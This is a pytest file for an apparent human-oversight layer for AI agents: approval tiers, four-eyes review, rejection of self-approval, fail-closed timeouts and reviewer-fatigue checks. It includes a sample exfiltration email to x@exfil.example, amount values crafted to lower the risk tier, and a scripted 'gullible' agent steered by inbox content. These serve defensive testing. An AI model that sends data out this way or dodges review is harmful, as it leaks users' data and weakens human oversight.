from __future__ import annotations

from ags.core import (
    Context,
    FakeClock,
    Principal,
    Runtime,
    ScriptedModel,
    ToolSpec,
    build_env,
    call,
)
from ags.oversight import (
    ApprovalPolicy,
    ApprovalQueue,
    AutoReviewer,
    ScriptedHuman,
    fatigue,
)

ASHA = Principal("asha", tenant="acme")
REFUND = ToolSpec("issue_refund", "write", "high")
EMAIL = ToolSpec("send_email", "external", "high")
POLICY = ApprovalPolicy()


def ctx(*labels: str) -> Context:
    return Context("run-1", "agent", ASHA, set(labels))


def refund(amount) -> object:
    return call(
        "issue_refund", customer_id="C-100", amount=amount
    )


def tier(c: Context, spec: ToolSpec, k) -> str:
    return POLICY.assess(c, spec, k).tier


def test_tiers_follow_amount_and_influence():
    lookup = ToolSpec("lookup_customer", "read", "medium")
    assert tier(ctx(), lookup, call("lookup_customer")) == "low"
    assert tier(ctx(), REFUND, refund(150)) == "medium"
    assert tier(ctx(), REFUND, refund(900)) == "high"
    assert tier(ctx("untrusted"), REFUND, refund(10)) == "high"
    assert tier(ctx("pii"), EMAIL, call("send_email")) == "medium"


def test_amount_tricks_do_not_lower_the_tier():
    for sneaky in ("9e2", -900, "nine hundred", None):
        assert (
            POLICY.assess(ctx(), REFUND, refund(sneaky)).tier
            == "high"
        )


def queue(*reviewers, timeout=600.0) -> ApprovalQueue:
    return ApprovalQueue(POLICY, reviewers, FakeClock(), timeout)


def test_four_eyes_needs_two_distinct_humans():
    q = queue(
        AutoReviewer(max_tier="high", max_amount=10_000),
        ScriptedHuman("maria"),
        ScriptedHuman("maria"),
    )
    assert not q(ctx(), REFUND, refund(900), None)
    assert q.requests[0].status == "timed_out"
    assert q.requests[0].approvers() == ["maria"]


def test_no_self_approval():
    q = queue(ScriptedHuman("asha"), ScriptedHuman("maria"))
    assert q(ctx(), REFUND, refund(150), None)
    assert q.requests[0].approvers() == ["maria"]


def test_refusal_vetoes_and_timeout_fails_closed():
    q = queue(
        ScriptedHuman("maria", lambda r: False),
        ScriptedHuman("omar"),
    )
    assert not q(ctx(), REFUND, refund(900), None)
    assert q.requests[0].status == "refused"
    slow = queue(ScriptedHuman("maria", seconds=700))
    assert not slow(ctx(), REFUND, refund(150), None)
    assert slow.requests[0].status == "timed_out"
    assert slow.clock.now() == 600


def test_auto_reviewer_never_handles_untrusted_influence():
    q = queue(AutoReviewer(max_tier="high"))
    assert not q(ctx("untrusted"), REFUND, refund(5), None)
    assert q.requests[0].votes == []


def test_summary_warns_about_untrusted_influence():
    q = queue()
    req = q.submit(
        ctx("untrusted", "pii"),
        EMAIL,
        call("send_email", to="x@exfil.example", body="y" * 99),
    )
    assert req.summary[1] == "  to: x@exfil.example"
    assert (
        req.summary[2].endswith("...")
        and len(req.summary[2]) < 40
    )
    assert req.summary[-1].startswith("WARNING")


def test_runtime_blocks_injected_email_and_fatigue_flags():
    env, tools = build_env()
    clock = FakeClock()
    q = ApprovalQueue(
        POLICY,
        [
            ScriptedHuman("maria", lambda r: not r.untrusted, 30),
            ScriptedHuman("omar", seconds=2),
        ],
        clock,
    )
    rt = Runtime(tools, [POLICY], approver=q, clock=clock)
    rt.run(
        ASHA,
        "inbox",
        ScriptedModel([call("read_inbox")], gullible=True),
    )
    rt.run(ASHA, "refund", ScriptedModel([refund(900)]))
    assert env.sent == [] and env.refunds[0]["amount"] == 900
    f = fatigue(q.requests)
    assert f.rubber_stamps == {"omar": 1}
    assert f.decisions == 4 and f.approval_rate == 0.5


def test_example_main(capsys):
    import ch12_oversight

    ch12_oversight.main()
    out = capsys.readouterr().out
    assert "four-eyes maria+omar" in out
    assert (
        "send_email        high   four-eyes refused: maria" in out
    )
    assert "emails sent: 0" in out
